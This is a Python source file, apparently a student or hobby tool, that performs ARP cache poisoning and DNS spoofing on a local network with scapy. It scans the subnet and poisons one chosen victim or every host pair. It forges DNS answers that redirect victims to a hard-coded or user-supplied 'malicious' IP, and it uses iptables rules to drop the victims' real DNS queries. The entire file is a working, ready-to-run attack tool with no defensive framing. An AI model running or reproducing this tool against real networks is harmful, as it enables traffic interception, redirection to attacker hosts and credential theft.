from scapy.all import *
import threading
import sys

malicious_ip = "131.155.34.15"
ip_victims = []
stop = False

def scan_network(ip_range, interface):
    arp = ARP(pdst=ip_range)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp

    result = srp(packet, iface=interface, timeout=2, verbose=False)[0]

    devices = []

    for sent, received in result:
        devices.append({"ip": received.psrc, "mac": received.hwsrc})

    return devices

def get_mac_from_list(ip, devices):
    for item in devices:
        if item["ip"] == ip:
            return item["mac"]
    return None

def get_own_ip_and_mac(spoof_interface):
    ip = get_if_addr(spoof_interface)
    mac = get_if_hwaddr(spoof_interface)
    return ip, mac

def arp_poison(ipAttacker, macAttacker, ipVictim, macVictim, ipToSpoof, nrPackets, interval, spoof_interface):
    arp= Ether() / ARP()
    arp[Ether].src = macAttacker
    arp[ARP].hwsrc = macAttacker
    arp[ARP].psrc = ipToSpoof
    arp[ARP].hwdst = macVictim
    arp[ARP].pdst = ipVictim

    sendp(arp, iface=spoof_interface, count=nrPackets, inter=interval)

def restore_arp(ipVictim, macVictim, ipToSpoof, macToSpoof, spoof_interface):
    # Construct ARP packet to restore ARP table of the victim
    arp_response = ARP( pdst=ipVictim, hwdst=macVictim, psrc=ipToSpoof, hwsrc=macToSpoof, op=2)

    # Send ARP packet to the victim
    send(arp_response, iface=spoof_interface, count=5, verbose=0)

# Function to send a spoofed DNS response and drop the original DNS packet
def send_dns_spoof(pkt):
    global stop
    if stop:
        sys.exit()
    # Check if it's a DNS query
    if pkt.haslayer(DNS) and pkt[DNS].qr == 0 and pkt[IP].src in ip_victims:  
        target_ip = pkt[IP].src
        query_id = pkt[DNS].id
        domain_to_spoof = pkt[DNSQR].qname.decode('utf-8').encode('ascii', 'ignore')
        print("Domain to spoof: " + domain_to_spoof)
       
        # Define the malicious IP address to redirect the target to
        global malicious_ip
       
        print("Intercepted DNS Query for " + domain_to_spoof)

        # Create a DNS response packet
        dns_response = (
            IP(src=pkt[IP].dst, dst=target_ip) /
            UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) /
            DNS(
                id=query_id,  # Match the query ID
                qr=1,         # This is a response
                aa=1,         # Authoritative answer
                qd=pkt[DNS].qd,  # Copy the question section
                an=DNSRR(rrname=domain_to_spoof, ttl=10, rdata=malicious_ip)   # Answer section with spoofed IP
            )
        )

        # Send the spoofed DNS response
        send(dns_response, verbose=0)
        print("Sent spoofed DNS response to " + target_ip + ", " + domain_to_spoof + " -> " + malicious_ip)

# Function to block DNS queries from a specific IP with iptables
def block_dns_query(target_ip):
    command =   "sudo iptables -I FORWARD 1 -s " + target_ip + " -p udp --dport 53 -j DROP"
    os.system(command)

# Cleanup the iptables rules before starting and after ending
def cleanup_iptables(target_ip):
    #os.system("sudo iptables -F")
    command =   "sudo iptables -D FORWARD -s " + target_ip + " -p udp --dport 53 -j DROP"
    os.system(command)

def dns_spoof():
    print("Starting DNS spoofing script...")

    # Add rule to block all outgoing DNS packets
    for ip_victim in ip_victims:
        block_dns_query(ip_victim)
    
    malicious_address = raw_input("Enter an ip to which you would like the user to be redirect(leave empty for a default): ")
    if not(malicious_address == ""):
        global malicious_ip
        malicious_ip = malicious_address
        
    thread_dns = threading.Thread(target=start_dns_spoof)
    thread_dns.start()
 
def start_dns_spoof():
    try:
        # Start sniffing
        print("Started sniffing. Press Ctrl+C to stop.")
        sniff(filter="udp port 53", prn=send_dns_spoof, stop_filter=stop)
    except KeyboardInterrupt:
        print("Stopped")
    finally:
        # Clean up the rule
        for ip_victim in ip_victims:
            cleanup_iptables(ip_victim)
        print("Cleared rule")
    
def silent_attack(ip_attacker, mac_attacker, spoof_interface, interval, nrPackets, dns_spoofing):
    print("Entered silent mode")

    # Scan network for devices
    ip_parts = ip_attacker.split(".")
    ip_range = ip_parts[0] + "." + ip_parts[1] + "." + ip_parts[2] + ".0/24"
    devices = scan_network(ip_range, spoof_interface)
    
    print("Devices on network:")
    for device in devices:
        print("IP: " + device["ip"] + ", MAC: " + device["mac"])
    
    # Get MAC address of victim
    while True:
        ip_victim = raw_input("Choose IP address of your victim: ")
        mac_victim = get_mac_from_list(ip_victim, devices)
        if mac_victim:
            break
        print("Could not find a MAC address for this IP address. Try a different one")
            
    # Get MAC address of device to spoof
    while True:
        ip_to_spoof = raw_input("Choose IP address of the device that you want to spoof: ")
        mac_to_spoof = get_mac_from_list(ip_to_spoof, devices)
        if mac_to_spoof:
            break
        print("Could not find a MAC address for this IP address. Try a different one")
    
    if dns_spoofing == "yes":
        global ip_victims
        ip_victims = [ip_victim]
        dns_spoof()

    # Create the threads for poisoning
    thread1 = threading.Thread(target=arp_poison, args=(ip_attacker, mac_attacker, ip_victim, mac_victim, ip_to_spoof, nrPackets, interval, spoof_interface))
    thread2 = threading.Thread(target=arp_poison, args=(ip_attacker, mac_attacker, ip_to_spoof, mac_to_spoof, ip_victim, nrPackets, interval, spoof_interface))

    print("Start sending ARP packets")
    
    # Start executing the poisoning using the gathered MAC addresses and number of packets
    thread1.start()
    thread2.start()
    
    # Join the threads after finishing
    thread1.join()
    thread2.join()

    print("ARP packet sending complete")

    restore_arp(ip_victim, mac_victim, ip_to_spoof, mac_to_spoof, spoof_interface)
    restore_arp(ip_to_spoof, mac_to_spoof, ip_victim, mac_victim, spoof_interface)

    print("ARP tables restored")

    print("Shutting down...")
    global stop
    stop = True
    sys.exit()

def all_out_attack(ip_attacker, mac_attacker, spoof_interface, interval, nrPackets, dns_spoofing):
    print("Entered all-out mode")

    # Scan network for devices
    ip_parts = ip_attacker.split(".")
    ip_range = ip_parts[0] + "." + ip_parts[1] + "." + ip_parts[2] + ".0/24"
    devices = scan_network(ip_range, spoof_interface)
    network_size = len(devices)
    
    # Create the threads for the poisoning
    thread_list = [[0 for _ in range(network_size)] for _ in range(network_size)]
    for i in range(0, network_size):
        for j in range(0, network_size):
            if not(i == j):
                thread_list[i][j] = threading.Thread(target=arp_poison, args=(ip_attacker, mac_attacker, devices[i]["ip"], devices[i]["mac"], devices[j]["ip"], nrPackets, interval, spoof_interface))
       
    if dns_spoofing == "yes":
        global ip_victims
        ip_victims = [device['ip'] for device in devices]
        dns_spoof()

    print("Start sending ARP packets")
    
    # Start executing the poisoning using the gathered MAC addresses and number of packets
    for i in range(0, network_size):
        for j in range(0, network_size):
            if not(i == j):
                thread_list[i][j].start()
    
    # Join the threads after finishing
    for i in range(0, network_size):
        for j in range(0, network_size):
            if not(i == j):
                thread_list[i][j].join()

    print("ARP packet sending complete") 
    
    # Restore the ARP tables
    for i in range(0, network_size):
        for j in range(0, network_size):
            if not(i == j):
                restore_arp(devices[i]["ip"], devices[i]["mac"], devices[j]["ip"], devices[j]["mac"], spoof_interface)
    print("ARP table restoring complete")

    print("Shutting down...")
    global stop
    stop = True
    sys.exit()

def main():
    # Get all interfaces of device
    interfaces = get_if_list()
    print("Available network interfaces")
    for item in interfaces:
        print(item)

    # Ask user for their interface
    while True:
        spoof_interface = raw_input("Enter interface: ")
        if spoof_interface in interfaces:
            break
        print("Please enter a valid network interface")

    # Get IP address and MAC address of attacker
    ip_attacker, mac_attacker = get_own_ip_and_mac(spoof_interface)

    # Ask user whether they want to use the tool in silent mode or all-out mode
    while True:
        silent = raw_input("Enter 0 for all-out attack mode, Enter 1 for silent attack mode: ")
        if (silent == "0" or silent == "1"):
            break
        print("Invalid input")
    
    # Get duration of poisoning and calculate number of ARP packets to send
    duration = input("How long do you want the attack to last? (minutes): ")
    interval = 5
    nrPackets = (duration * 60) / interval
    
    # Ask user whether they want to also use dns spoofing
    while True:
        dns_spoofing = raw_input("Would you like to include DNS spoofing in the attack? (yes/no): ")
        if dns_spoofing == "yes" or dns_spoofing == "no":
            break
        print("Please enter a valid answer(yes/no)")

    if silent == "1":
        silent_attack(ip_attacker, mac_attacker, spoof_interface, interval, nrPackets, dns_spoofing)
    else:
        all_out_attack(ip_attacker, mac_attacker, spoof_interface, interval, nrPackets, dns_spoofing)
        
if __name__ == "__main__":
    main()
